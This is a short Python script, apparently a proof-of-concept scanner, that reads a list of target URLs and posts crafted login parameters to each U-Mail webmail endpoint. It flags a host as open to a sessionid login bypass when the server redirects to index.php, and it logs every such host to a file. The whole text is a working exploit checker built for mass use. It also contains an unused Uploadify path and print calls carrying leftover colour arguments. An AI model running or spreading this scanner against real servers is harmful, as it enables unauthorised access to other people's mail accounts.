import sys
import json
import requests
import warnings



urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    }
    payload = "/webmail/fast/index.php?module=operate&action=login"
    post_data = {
        "mailbox": "test@domain.com",
        "link": "?"
    }
    vulnurl = url + payload
    try:
        req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
        if r'<meta http-equiv="refresh" content="0; URL=index.php">' in req.text:
            print("[+]存在umail sessionid登录漏洞...(中危)\tpayload: " + vulnurl + "\npost: " + json.dumps(post_data, indent=4),"yellow")
            with open('sessionid登录漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在umail_sessionid_access漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

